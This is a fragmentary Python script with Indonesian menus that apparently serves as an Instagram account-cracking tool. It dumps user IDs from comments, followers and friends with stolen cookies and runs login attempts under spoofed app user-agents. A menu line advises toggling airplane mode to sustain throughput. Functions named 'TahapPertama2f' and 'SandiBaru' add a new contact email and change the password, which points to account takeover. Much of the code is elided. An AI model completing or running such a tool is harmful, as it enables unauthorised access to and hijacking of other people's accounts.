...
class MAIN:
   ...
   def __init__(self):
       super(MAIN).__init__()
       self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2142 Build/UP1A.240305.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.105 Mobile Safari/537.36',}
  ...
  ▒ ░░ ░   ░ ░          ░░   ░   ░   ▒   ░        ░ ░░ ░ ''')
   ...
   def aset_ig(self):
       ...
       try:
           xyz = {'user-agent': 'Instagram 289.0.0.77.109 Android (34/15; 320dpi; 720x1600; samsung; SM-A145F; a14; arm64-v8a; en_US; 498229134)'}
...
[white] 01. Set Tema Hijau          04. Set Tema Putih\n\
 ...
 07. Set Tema Default',True)
   ...
   def dump_komen(self, cokie, uid, min):
       global xx
       try:
            self.r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 15; CPH2487 Build/UP1A.240305.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',}).json()
...
[white]Masukan Nama File Untuk Melihat Hasil, Gunakan koma untuk pemisahan nama file',True)
   ...
   def Exekusi(self, uid, cokie, next, mode,unli=None):
       global xx
       headers = {'Host': 'www.instagram.com','x-requested-with': 'XMLHttpRequest','x-csrftoken': re.search('csrftoken=(.*?);',str(cokie['cookie'])).group(1),'x-ig-app-id': '1217981644879628','user-agent': '[FBAN/FB4A;FBAV/457.0.0.41.115;FBBV/467853534;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 13 Pro;FBSV/15;FBCA/arm64-v8a;]','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
   ...
   def Graphql(self, typess, userid, cokie,after):
       ...
       try:
           self.ptk = {"user-agent": "[FBAN/FB4A;FBAV/457.0.0.41.115;FBBV/467853534;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 13 Pro;FBSV/15;FBCA/arm64-v8a;]","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
...
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')
   ...
   def Fafo(self, cokie):
       try:
           ...
           self.x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.c) == 0 else self.c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "[FBAN/FB4A;FBAV/457.0.0.41.115;FBBV/467853534;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 13 Pro;FBSV/15;FBCA/arm64-v8a;]","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
   ...
   def friends_user(self, cookies):
       try:
            InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 323.0.0.16.84 Android (34/15; 480dpi; 1440x3120; samsung; SM-S928B; dm3q; arm64-v8a; en_US; 589622947)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
            edit = {'edit': 'true'}
   ...
   def HeadersApiLogin(self):
       return {
          ...
          'priority': 'u=3',
          'user-agent': 'Mozilla/5.0 (Linux; Android 15; Pixel 8 Pro Build/UP1A.240305.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
 ...
 {P}data profile : {K2}{followers}/{following}/{postingan}                             ''')
   ...
   def headers_graph(self, xxx):
       headers = {
           ...
           'user-agent': '[FBAN/FB4A;FBAV/457.0.0.41.115;FBBV/467853534;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 13 Pro;FBSV/15;FBCA/arm64-v8a;]',
   ...
   def TahapPertama2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
       try:
           ...
           head.update({
               ...
               'user-agent': 'Mozilla/5.0 (Linux; Android 15; CPH2487 Build/UP1A.240305.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
   ...
   def SandiBaru(self, cookie, old_pw):
       try:
            ...
            head = self.headers_graph(resp)
            head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': '[FBAN/FB4A;FBAV/457.0.0.41.115;FBBV/467853534;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 13 Pro;FBSV/15;FBCA/arm64-v8a;]',})
            data      = self.data_graph(resp)
